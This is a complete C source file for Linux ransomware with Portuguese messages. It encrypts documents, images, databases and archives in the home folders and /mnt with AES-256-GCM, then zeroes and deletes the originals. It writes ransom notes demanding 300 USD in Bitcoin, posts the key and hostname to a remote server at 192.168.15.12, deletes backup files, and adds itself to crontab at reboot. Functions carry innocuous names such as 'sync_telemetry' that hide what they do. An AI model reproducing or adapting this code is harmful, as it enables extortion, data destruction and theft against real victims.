#define _GNU_SOURCE
#define AES_KEY_SIZE 32

#include <ctype.h>
#include <curl/curl.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <limits.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <pwd.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

/* ====== Applicative-specific constants ====== */
#define BASE64_ENCODED_LEN ((AES_KEY_SIZE+ 2) / 3 * 4 + 1)
#define KEY_FILE "/tmp/.master.key"
#define GCM_TAG_LEN 16
#define GCM_NONCE_LEN 12
#define NOTIFICATION_FILENAME "#_STATUS_NOTICE_#.txt"
#define MAX_KEY_LEN 256
#define MAX_HOSTNAME_LEN 256
#define MAX_JSON_LEN 2048
#define PATH_MAX 4096

/* ====== Global AES key (used by apply_transform) ====== */
const unsigned char aes_key[AES_KEY_SIZE];

/* ====== Function prototypes ====== */
const uint8_t* init_session(void);
char **scan_storage(size_t *count);
static void free_paths(char **paths);
int apply_transform(const char *filename);
int write_notice(const char *transformed_files[]);
int sync_telemetry(void);
int register_service(const char *argv0);

/* ====== Forward declaration for expand_home ====== */
char *expand_home(const char *path);

/* ====== Module 1: init_session ====== */
const uint8_t* init_session(void) {
    static uint8_t key[AES_KEY_SIZE];
    char base64_buf[BASE64_ENCODED_LEN];
    int ret;
    int fd_tmp = -1;
    FILE *fp = NULL;
    const uint8_t *result = NULL;
    char tmp_template[] = "/tmp/.master.key.XXXXXX";

    if (RAND_bytes(key, AES_KEY_SIZE) != 1) {
        fprintf(stderr, "init_session: falha ao gerar chave AES-256 (RAND_bytes)\n");
        return NULL;
    }

    ret = EVP_EncodeBlock((unsigned char*)base64_buf, key, AES_KEY_SIZE);
    if (ret < 0 || ret >= (int)sizeof(base64_buf)) {
        fprintf(stderr, "init_session: falha ao codificar Base64\n");
        return NULL;
    }

    fd_tmp = mkstemp(tmp_template);
    if (fd_tmp == -1) {
        perror("init_session: mkstemp");
        goto cleanup;
    }

    if (fchmod(fd_tmp, 0600) == -1) {
        perror("init_session: fchmod");
        close(fd_tmp);
        unlink(tmp_template);
        goto cleanup;
    }

    fp = fdopen(fd_tmp, "w");
    if (fp == NULL) {
        perror("init_session: fdopen");
        close(fd_tmp);
        unlink(tmp_template);
        goto cleanup;
    }

    if (fprintf(fp, "{\"aes_key\":\"%s\"}\n", base64_buf) < 0) {
        perror("init_session: fprintf");
        fclose(fp);
        unlink(tmp_template);
        goto cleanup;
    }

    if (fclose(fp) == EOF) {
        perror("init_session: fclose");
        unlink(tmp_template);
        goto cleanup;
    }
    fp = NULL;
    fd_tmp = -1;

    if (rename(tmp_template, KEY_FILE) == -1) {
        perror("init_session: rename");
        unlink(tmp_template);
        goto cleanup;
    }
    result = key;

cleanup:
    if (fp != NULL) fclose(fp);
    if (fd_tmp != -1) { close(fd_tmp); unlink(tmp_template); }
    return result;
}

/* ====== Module 2: scan_storage ====== */
static const char *extensions[] = {
    ".xlsx", ".docx", ".pdf", ".txt", ".csv",
    ".jpg",  ".png",  ".db",  ".backup",
    ".psd",  ".zip",  ".rar"
};
static const size_t num_ext = sizeof(extensions) / sizeof(extensions[0]);

static int has_allowed_extension(const char *filename) {
    const char *dot = strrchr(filename, '.');
    if (!dot) return 0;
    size_t ext_len = strlen(dot);
    if (ext_len == 0) return 0;
    char lower[ext_len + 1];
    for (size_t i = 0; i < ext_len; i++) lower[i] = tolower((unsigned char)dot[i]);
    lower[ext_len] = '\0';
    for (size_t i = 0; i < num_ext; i++) if (strcmp(lower, extensions[i]) == 0) return 1;
    return 0;
}

static int add_path(char ***paths, size_t *count, size_t *capacity, const char *fullpath) {
    if (*count >= *capacity) {
        size_t new_cap = (*capacity == 0) ? 128 : *capacity * 2;
        char **new_paths = realloc(*paths, (new_cap + 1) * sizeof(char *));
        if (!new_paths) {
            for (size_t i = 0; i < *count; i++) free((*paths)[i]);
            free(*paths);
            *paths = NULL; *count = 0; *capacity = 0;
            return -1;
        }
        *paths = new_paths;
        *capacity = new_cap;
    }
    (*paths)[*count] = strdup(fullpath);
    if (!(*paths)[*count]) {
        for (size_t i = 0; i < *count; i++) free((*paths)[i]);
        free(*paths);
        *paths = NULL; *count = 0; *capacity = 0;
        return -1;
    }
    (*count)++;
    (*paths)[*count] = NULL;
    return 0;
}

static int walk_directory(const char *dirpath, char ***paths, size_t *count, size_t *capacity) {
    DIR *dir = opendir(dirpath);
    if (!dir) return 0;
    struct dirent *entry;
    int ret = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        char fullpath[PATH_MAX];
        int len = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);
        if (len < 0 || (size_t)len >= sizeof(fullpath)) continue;
        struct stat st;
        if (lstat(fullpath, &st) != 0) continue;
        if (S_ISLNK(st.st_mode)) continue;
        if (S_ISDIR(st.st_mode)) {
            ret = walk_directory(fullpath, paths, count, capacity);
            if (ret != 0) break;
        } else if (S_ISREG(st.st_mode)) {
            if (has_allowed_extension(entry->d_name)) {
                if (add_path(paths, count, capacity, fullpath) != 0) { ret = -1; break; }
            }
        }
    }
    closedir(dir);
    return ret;
}

static void free_paths(char **paths) {
    if (!paths) return;
    for (size_t i = 0; paths[i] != NULL; i++) free(paths[i]);
    free(paths);
}

char **scan_storage(size_t *count) {
    *count = 0;
    const char *base_dirs[] = {
        "~/Documentos_Teste",
        "~/Documentos",
        "~/Downloads",
        "~/Imagens",
        "/mnt"
    };
    size_t num_dirs = sizeof(base_dirs) / sizeof(base_dirs[0]);
    char **paths = NULL;
    size_t capacity = 0;
    for (size_t i = 0; i < num_dirs; i++) {
        char *expanded = expand_home(base_dirs[i]);
        if (!expanded) continue;
        if (walk_directory(expanded, &paths, count, &capacity) == -1) {
            free(expanded);
            break;
        }
        free(expanded);
    }
    if (paths == NULL) {
        paths = malloc(sizeof(char *));
        if (paths) paths[0] = NULL;
        *count = 0;
    } else {
        paths[*count] = NULL;
    }
    return paths;
}

/* ====== Module 3: apply_transform ====== */
#define ERR_FILE_NOT_FOUND  -100
#define ERR_NOT_REGULAR     -101
#define ERR_MEMORY          -102
#define ERR_READ            -103
#define ERR_WRITE           -104
#define ERR_CIPHER_INIT     -105
#define ERR_CIPHER_UPDATE   -106
#define ERR_CIPHER_FINAL    -107
#define ERR_CIPHER_CTRL     -108
#define ERR_RANDOM          -109
#define ERR_REMOVE          -110

static void secure_wipe(void *ptr, size_t len) {
    if (ptr && len) {
#if defined(__GNUC__) && !defined(__STRICT_ANSI__)
        __asm__ __volatile__("" : : "r"(ptr) : "memory");
#endif
        explicit_bzero(ptr, len);
        memset(ptr, 0, len);
    }
}

static int check_regular_file(const char *path) {
    struct stat statbuf;
    if (stat(path, &statbuf) != 0) {
        if (errno == ENOENT) { fprintf(stderr, "Error: File '%s' not found\n", path); return ERR_FILE_NOT_FOUND; }
        perror("stat failed");
        return ERR_FILE_NOT_FOUND;
    }
    if (!S_ISREG(statbuf.st_mode)) {
        fprintf(stderr, "Error: '%s' is not a regular file\n", path);
        return ERR_NOT_REGULAR;
    }
    return 0;
}

static char *construct_output_path(const char *input_path) {
    size_t input_len = strlen(input_path);
    const char *suffix = ".PROCESSED";
    size_t suffix_len = strlen(suffix);
    char *output_path = malloc(input_len + suffix_len + 1);
    if (!output_path) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
    strcpy(output_path, input_path);
    strcat(output_path, suffix);
    return output_path;
}

static int sanitize_and_delete(const char *filepath) {
    int result = 0;
    FILE *fp = fopen(filepath, "r+");
    if (!fp) {
        if (remove(filepath) != 0) { fprintf(stderr, "Failed to remove file %s: %s\n", filepath, strerror(errno)); return ERR_REMOVE; }
        return 0;
    }
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    rewind(fp);
    char *zero_buffer = calloc(1, 4096);
    if (!zero_buffer) { fclose(fp); return ERR_MEMORY; }
    long remaining = file_size;
    while (remaining > 0) {
        size_t write_size = (remaining > 4096) ? 4096 : (size_t)remaining;
        if (fwrite(zero_buffer, 1, write_size, fp) != write_size) {
            result = ERR_WRITE;
            break;
        }
        remaining -= (long)write_size;
        fflush(fp);
    }
    free(zero_buffer);
    fclose(fp);
    int fd = open(filepath, O_RDWR);
    if (fd >= 0) { fsync(fd); close(fd); }
    if (remove(filepath) != 0) { perror("Failed to delete original file"); result = (result == 0) ? ERR_REMOVE : result; }
    return result;
}

int apply_transform(const char *filename) {
    if (!filename) { fprintf(stderr, "NULL filename provided\n"); return -1; }
    int check_result = check_regular_file(filename);
    if (check_result != 0) return check_result;

    FILE *input_fp = fopen(filename, "rb");
    if (!input_fp) { perror("Failed to open input file"); return ERR_FILE_NOT_FOUND; }
    fseek(input_fp, 0, SEEK_END);
    long file_size = ftell(input_fp);
    rewind(input_fp);
    if (file_size < 0) { fclose(input_fp); return ERR_READ; }

    unsigned char *plaintext = malloc(file_size > 0 ? file_size : 1);
    if (!plaintext) { fclose(input_fp); return ERR_MEMORY; }
    if (file_size > 0 && fread(plaintext, 1, file_size, input_fp) != (size_t)file_size) { secure_wipe(plaintext, file_size); free(plaintext); fclose(input_fp); return ERR_READ; }
    fclose(input_fp);

    unsigned char nonce[GCM_NONCE_LEN];
    if (RAND_bytes(nonce, sizeof(nonce)) != 1) { secure_wipe(plaintext, file_size); free(plaintext); return ERR_RANDOM; }

    EVP_CIPHER_CTX *ctx = NULL;
    int ret = -1;
    int result = 0;
    unsigned char *ciphertext = NULL;
    unsigned char tag[GCM_TAG_LEN];
    char *output_path = NULL;
    FILE *output_fp = NULL;

    ciphertext = malloc(file_size + EVP_MAX_BLOCK_LENGTH);
    if (!ciphertext) { secure_wipe(plaintext, file_size); free(plaintext); return ERR_MEMORY; }

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { result = ERR_CIPHER_INIT; goto cleanup; }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) { result = ERR_CIPHER_INIT; goto cleanup; }
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, aes_key, nonce) != 1) { result = ERR_CIPHER_INIT; goto cleanup; }

    int len = 0;
    int ciphertext_len = 0;
    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, (int)file_size) != 1) { result = ERR_CIPHER_UPDATE; goto cleanup; }
    ciphertext_len = len;
    if (EVP_EncryptFinal_ex(ctx, ciphertext + ciphertext_len, &len) != 1) { result = ERR_CIPHER_FINAL; goto cleanup; }
    ciphertext_len += len;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_LEN, tag) != 1) { result = ERR_CIPHER_CTRL; goto cleanup; }

    output_path = construct_output_path(filename);
    if (!output_path) { result = ERR_MEMORY; goto cleanup; }

    output_fp = fopen(output_path, "wb");
    if (!output_fp) { perror("Failed to create output file"); result = ERR_WRITE; goto cleanup; }

    if (fwrite(nonce, 1, sizeof(nonce), output_fp) != sizeof(nonce)) { result = ERR_WRITE; goto cleanup; }
    if (ciphertext_len > 0 && fwrite(ciphertext, 1, ciphertext_len, output_fp) != (size_t)ciphertext_len) { result = ERR_WRITE; goto cleanup; }
    if (fwrite(tag, 1, sizeof(tag), output_fp) != sizeof(tag)) { result = ERR_WRITE; goto cleanup; }
    if (fflush(output_fp) != 0) { result = ERR_WRITE; goto cleanup; }
    fclose(output_fp);
    output_fp = NULL;

    int sanitize_result = sanitize_and_delete(filename);
    if (sanitize_result != 0) { remove(output_path); result = sanitize_result; goto cleanup; }

    ret = 0; // success

cleanup:
    if (output_fp) { fclose(output_fp); if (ret != 0) remove(output_path); }
    if (plaintext) { secure_wipe(plaintext, file_size); free(plaintext); }
    if (ciphertext) { secure_wipe(ciphertext, file_size + EVP_MAX_BLOCK_LENGTH); free(ciphertext); }
    if (ctx) { EVP_CIPHER_CTX_free(ctx); }
    if (output_path) free(output_path);
    ERR_clear_error();
    return ret != 0 ? result : 0;
}

/* ====== Module 4: write_notice ====== */
static const char* notice_content[] = {
    "INSTRUÇÃO DE PAGAMENTO\n",
    "Efetuar remessa de 300 USD para o serviço de pagamento no endereço:\n",
    "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n",
    "\n",
    "Contatar via canal seguro para confirmação.\n",
    NULL
};

static int dir_contains(const char* dirs[], const char* candidate) {
    if (!candidate) return 0;
    for (size_t i = 0; dirs[i]; i++) if (strcmp(dirs[i], candidate) == 0) return 1;
    return 0;
}

static int write_notice_content(const char* dirpath) {
    char notice_path[PATH_MAX];
    int result = 0;
    size_t len = snprintf(notice_path, sizeof(notice_path), "%s/%s", dirpath, NOTIFICATION_FILENAME);
    if (len >= sizeof(notice_path)) return -1;
    FILE* fp = fopen(notice_path, "w");
    if (!fp) return -1;
    if (fputs(notice_content[0], fp) == EOF) result = -1;
    if (fputs(notice_content[1], fp) == EOF) result = -1;
    if (fputs(notice_content[2], fp) == EOF) result = -1;
    if (fputs(notice_content[3], fp) == EOF) result = -1;
    if (fputs(notice_content[4], fp) == EOF) result = -1;
    if (fclose(fp) != 0) result = -1;
    return result;
}

int write_notice(const char* transformed_files[]) {
    if (!transformed_files) return -1;
    char** processed_dirs = NULL;
    size_t processed_count = 0;
    size_t processed_capacity = 0;
    int overall_status = 0;
    for (size_t i = 0; transformed_files[i]; i++) {
        const char* filepath = transformed_files[i];
        if (!filepath) continue;
        char* dup_path = strdup(filepath);
        if (!dup_path) { overall_status = -1; continue; }
        char* dirname_result = dirname(dup_path);
        if (!dirname_result || *dirname_result == '\0') { free(dup_path); overall_status = -1; continue; }
        char resolved_dir[PATH_MAX];
        if (strlen(dirname_result) >= sizeof(resolved_dir)) { free(dup_path); overall_status = -1; continue; }
        strcpy(resolved_dir, dirname_result);
        if (!dir_contains((const char**)processed_dirs, resolved_dir)) {
            if (processed_count == processed_capacity) {
                size_t new_capacity = processed_capacity ? processed_capacity * 2 : 8;
                char** new_dirs = realloc(processed_dirs, new_capacity * sizeof(char*));
                if (!new_dirs) { free(dup_path); overall_status = -1; break; }
                processed_dirs = new_dirs;
                processed_capacity = new_capacity;
            }
            processed_dirs[processed_count] = strdup(resolved_dir);
            if (!processed_dirs[processed_count]) { free(dup_path); overall_status = -1; break; }
            processed_count++;
            if (write_notice_content(resolved_dir) != 0) overall_status = -1;
        }
        free(dup_path);
    }
    for (size_t i = 0; i < processed_count; i++) free(processed_dirs[i]);
    free(processed_dirs);
    return overall_status;
}

/* ====== Module 5: sync_telemetry ====== */
static size_t write_callback(void *ptr, size_t size, size_t nmemb, void *data) {
    (void)ptr; (void)data;
    return size * nmemb;
}

static int extract_aes_key(const char *json, char *out, size_t out_size) {
    if (!json || !out || out_size == 0) return -1;
    const char *key_marker = "\"aes_key\"";
    const char *start = strstr(json, key_marker);
    if (!start) return -1;
    start += strlen(key_marker);
    while (*start == ' ' || *start == '\t') start++;
    if (*start != ':') return -1;
    start++;
    while (*start == ' ' || *start == '\t') start++;
    if (*start != '"') return -1;
    start++;
    const char *end = strchr(start, '"');
    if (!end) return -1;
    size_t len = end - start;
    if (len >= out_size) len = out_size - 1;
    strncpy(out, start, len);
    out[len] = '\0';
    return 0;
}

int sync_telemetry(void) {
    FILE *fp = NULL;
    char *file_content = NULL;
    long file_size;
    char aes_key[MAX_KEY_LEN] = {0};
    char hostname[MAX_HOSTNAME_LEN] = {0};
    char json_body[MAX_JSON_LEN] = {0};
    CURL *curl = NULL;
    CURLcode res;
    long http_code = 0;
    int ret = -1;

    fp = fopen("/tmp/.master.key", "rb");
    if (!fp) { perror("fopen"); return -1; }
    fseek(fp, 0, SEEK_END);
    file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (file_size <= 0) { fprintf(stderr, "File is empty\n"); fclose(fp); return -1; }
    file_content = (char *)malloc(file_size + 1);
    if (!file_content) { perror("malloc"); fclose(fp); return -1; }
    size_t read_size = fread(file_content, 1, file_size, fp);
    if (read_size != (size_t)file_size) { perror("fread"); free(file_content); fclose(fp); return -1; }
    file_content[file_size] = '\0';
    fclose(fp);

    if (extract_aes_key(file_content, aes_key, sizeof(aes_key)) != 0) { fprintf(stderr, "Failed to parse aes_key\n"); free(file_content); return -1; }
    free(file_content);

    if (gethostname(hostname, sizeof(hostname)) != 0) { perror("gethostname"); return -1; }
    hostname[sizeof(hostname)-1] = '\0';

    snprintf(json_body, sizeof(json_body),
             "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
             aes_key, hostname);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (!curl) { fprintf(stderr, "curl_easy_init failed\n"); curl_global_cleanup(); return -1; }
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) { curl_easy_cleanup(curl); curl_global_cleanup(); return -1; }
    curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.15.12:8080/collect");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_body));
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) { fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res)); goto cleanup; }
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code == 200) {
        if (remove("/tmp/.master.key") != 0) { perror("remove"); goto cleanup; }
        ret = 0;
    } else {
        fprintf(stderr, "Server returned HTTP %ld\n", http_code);
        ret = -1;
    }

cleanup:
    if (headers) curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return ret;
}

/* ====== Module 6: register_service ====== */
static int cleanup_failed = 0;
static int cleanup_errno = 0;

static void cleanup_record_error(int e) { if (cleanup_errno == 0) cleanup_errno = e; cleanup_failed = 1; }

static int has_backup_suffix(const char *name) {
    size_t len = strlen(name);
    return (len >= 4 && strcmp(name + len - 4, ".bak") == 0) ||
           (len >= 7 && strcmp(name + len - 7, ".backup") == 0) ||
           (len >= 4 && strcmp(name + len - 4, ".old") == 0);
}

char *expand_home(const char *path) {  // non-static, used by scan_storage
    if (path[0] != '~') return strdup(path);
    const char *home = getenv("HOME");
    if (home == NULL) { errno = ENOENT; return NULL; }
    size_t home_len = strlen(home);
    size_t path_len = strlen(path);
    char *out = malloc(home_len + path_len + 1);
    if (out == NULL) return NULL;
    memcpy(out, home, home_len);
    strcpy(out + home_len, path + 1);
    return out;
}

static int scan_and_clean(const char *dir) {
    DIR *d = opendir(dir);
    if (d == NULL) { if (errno == ENOENT || errno == ENOTDIR) return 0; cleanup_record_error(errno); return -1; }
    struct dirent *ent;
    int ret = 0;
    errno = 0;
    while ((ent = readdir(d)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue;
        char path[PATH_MAX];
        int n = snprintf(path, sizeof(path), "%s/%s", dir, ent->d_name);
        if (n < 0 || (size_t)n >= sizeof(path)) { cleanup_record_error(ENAMETOOLONG); ret = -1; continue; }
        struct stat st;
        if (lstat(path, &st) != 0) { if (errno != ENOENT) { cleanup_record_error(errno); ret = -1; } continue; }
        if (S_ISDIR(st.st_mode)) { if (scan_and_clean(path) != 0) ret = -1; }
        else if (S_ISREG(st.st_mode)) {
            if (has_backup_suffix(ent->d_name)) {
                if (remove(path) != 0 && errno != ENOENT) { cleanup_record_error(errno); ret = -1; }
            }
        }
    }
    if (errno != 0) { cleanup_record_error(errno); ret = -1; }
    closedir(d);
    return ret;
}

static int cleanup_obsolete_files(void) {
    static const char * const targets[] = {
        "~/Documentos_Teste",
        "~/Documentos",
        "~/Downloads",
        "~/Imagens",
        "/mnt"
    };
    cleanup_failed = 0;
    cleanup_errno = 0;
    for (size_t i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
        char *base = expand_home(targets[i]);
        if (base == NULL) { int e = errno; cleanup_record_error(e); continue; }
        (void)scan_and_clean(base);
        free(base);
    }
    if (cleanup_failed) { errno = cleanup_errno ? cleanup_errno : EIO; return -1; }
    return 0;
}

static void free_entries(char **entries, size_t count) {
    if (entries == NULL) return;
    for (size_t i = 0; i < count; i++) free(entries[i]);
    free(entries);
}

static int load_crontab(char ***entries_out, size_t *count_out) {
    FILE *f = popen("crontab -l", "r");
    if (f == NULL) { if (errno == 0) errno = EIO; return -1; }
    char **entries = NULL;
    size_t count = 0;
    size_t cap = 0;
    char *line = NULL;
    size_t line_cap = 0;
    int error = 0;
    while (getline(&line, &line_cap, f) != -1) {
        const char *p = line;
        while (*p == ' ' || *p == '\t') p++;
        if (strncmp(p, "no crontab for", 14) == 0) continue;
        if (count == cap) {
            size_t new_cap = cap ? cap * 2 : 16;
            char **tmp = realloc(entries, new_cap * sizeof(*entries));
            if (tmp == NULL) { error = ENOMEM; break; }
            entries = tmp;
            cap = new_cap;
        }
        entries[count] = strdup(line);
        if (entries[count] == NULL) { error = ENOMEM; break; }
        count++;
    }
    if (ferror(f)) { if (error == 0) error = errno ? errno : EIO; }
    free(line);
    if (pclose(f) != 0 && error == 0) error = errno ? errno : EIO;
    if (error != 0) { free_entries(entries, count); errno = error; return -1; }
    if (count == cap) {
        size_t new_cap = cap ? cap * 2 : 16;
        char **tmp = realloc(entries, new_cap * sizeof(*entries));
        if (tmp == NULL) { free_entries(entries, count); errno = ENOMEM; return -1; }
        entries = tmp;
        cap = new_cap;
    }
    entries[count] = NULL;
    *entries_out = entries;
    *count_out = count;
    return 0;
}

static int is_crontab_entry_for(const char *line, const char *bin) {
    const char *p = line;
    while (*p == ' ' || *p == '\t') p++;
    if (strncmp(p, "@reboot", 7) != 0) return 0;
    p += 7;
    if (*p != ' ' && *p != '\t' && *p != '\r' && *p != '\n' && *p != '\0') return 0;
    while (*p == ' ' || *p == '\t') p++;
    if (*p == '\0' || *p == '\n' || *p == '\r') return 0;
    int quoted = 0;
    if (*p == '"') { quoted = 1; p++; }
    size_t bin_len = strlen(bin);
    if (strncmp(p, bin, bin_len) != 0) return 0;
    p += bin_len;
    if (quoted) { if (*p != '"') return 0; p++; }
    if (*p != '\0' && *p != '\n' && *p != '\r' && *p != ' ' && *p != '\t') return 0;
    return 1;
}

static char *resolve_binary_path(const char *argv0) {
    if (argv0 != NULL && argv0[0] != '\0') {
        char *resolved = realpath(argv0, NULL);
        if (resolved != NULL) return resolved;
    }
#ifdef __linux__
    {
        char exe[PATH_MAX];
        ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
        if (n <= 0) { if (errno == 0) errno = ENOENT; return NULL; }
        exe[n] = '\0';
        return strdup(exe);
    }
#else
    (void)argv0;
    errno = ENOENT;
    return NULL;
#endif
}

static int register_crontab(const char *argv0) {
    char *bin = resolve_binary_path(argv0);
    if (bin == NULL) return -1;
    char **entries = NULL;
    size_t count = 0;
    if (load_crontab(&entries, &count) != 0) { free(bin); return -1; }
    for (size_t i = 0; i < count; i++) {
        if (is_crontab_entry_for(entries[i], bin)) { free_entries(entries, count); free(bin); return 0; }
    }
    struct sigaction sa;
    struct sigaction old_sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGPIPE, &sa, &old_sa) != 0) { int saved = errno; free_entries(entries, count); free(bin); errno = saved; return -1; }
    FILE *out = popen("crontab -", "w");
    if (out == NULL) { int saved = errno; if (saved == 0) saved = EIO; (void)sigaction(SIGPIPE, &old_sa, NULL); free_entries(entries, count); free(bin); errno = saved; return -1; }
    int write_errno = 0;
    for (size_t i = 0; i < count; i++) { if (fputs(entries[i], out) == EOF) { write_errno = errno ? errno : EIO; break; } }
    if (write_errno == 0 && count > 0) {
        size_t last_len = strlen(entries[count - 1]);
        if (last_len == 0 || entries[count - 1][last_len - 1] != '\n') { if (fputc('\n', out) == EOF) write_errno = errno ? errno : EIO; }
    }
    if (write_errno == 0) { if (fprintf(out, "@reboot %s\n", bin) < 0) write_errno = errno ? errno : EIO; }
    int status = pclose(out);
    (void)sigaction(SIGPIPE, &old_sa, NULL);
    if (write_errno != 0) { free_entries(entries, count); free(bin); errno = write_errno; return -1; }
    if (status == -1) { if (errno == 0) errno = EIO; free_entries(entries, count); free(bin); return -1; }
    if (status != 0) { errno = EIO; free_entries(entries, count); free(bin); return -1; }
    free_entries(entries, count);
    free(bin);
    return 0;
}

int register_service(const char *argv0) {
    int crontab_rc = register_crontab(argv0);
    int crontab_err = (crontab_rc == 0) ? 0 : errno;
    int cleanup_rc = cleanup_obsolete_files();
    int cleanup_err = (cleanup_rc == 0) ? 0 : errno;
    if (crontab_rc != 0) {
        if (crontab_err != 0) errno = crontab_err;
        else if (cleanup_err != 0) errno = cleanup_err;
        else errno = EIO;
        perror("register_service");
        return -1;
    }
    if (cleanup_rc != 0) {
        if (cleanup_err != 0) errno = cleanup_err;
        else errno = EIO;
        perror("register_service");
        return -1;
    }
    return 0;
}

/* ====== Main ====== */
static void free_transformed_paths(char **paths) {
    if (!paths) return;
    for (size_t i = 0; paths[i] != NULL; i++) free(paths[i]);
    free(paths);
}

int main(int argc, char *argv[]) {
    (void)argc; // unused but required for argv[0]

    // 1. Key generation
    const uint8_t *session_key = init_session();
    if (!session_key) {
        fprintf(stderr, "main: init_session failed\n");
        exit(EXIT_FAILURE);
    }
    memcpy((void *)aes_key, session_key, AES_KEY_SIZE); // copy to global

    // 2. File scan
    size_t file_count = 0;
    char **files = scan_storage(&file_count);
    if (!files) {
        fprintf(stderr, "main: scan_storage failed\n");
        exit(EXIT_FAILURE);
    }

    // 3. Encryption & build transformed list
    char **transformed_paths = malloc((file_count+1)* sizeof(char*));
    if (!transformed_paths) { perror("malloc"); exit(EXIT_FAILURE); }
    size_t trans_count = 0;
    for (size_t i = 0; i < file_count; i++) {
        int ret = apply_transform(files[i]);
        if (ret == 0) {
            // Construct .PROCESSED path
            size_t len = strlen(files[i]) + strlen(".PROCESSED")+1;
            transformed_paths[trans_count] = malloc(len);
            if (!transformed_paths[trans_count]) {
                perror("malloc");
                for (size_t j = 0; j < trans_count; j++) free(transformed_paths[j]);
                free(transformed_paths);
                free_paths(files);
                exit(EXIT_FAILURE);
            }
            snprintf(transformed_paths[trans_count], len, "%s.PROCESSED", files[i]);
            trans_count++;
        } else {
            fprintf(stderr, "apply_transform failed for %s (error %d)\n", files[i], ret);
        }
    }
    transformed_paths[trans_count] = NULL;

    // 4. Write ransom notes
    write_notice((const char**)transformed_paths);

    // 5. Exfiltration
    sync_telemetry();

    // 6. Persistence
    register_service(argv[0]);

    // Cleanup
    free_paths(files);
    free_transformed_paths(transformed_paths);

    return 0;
}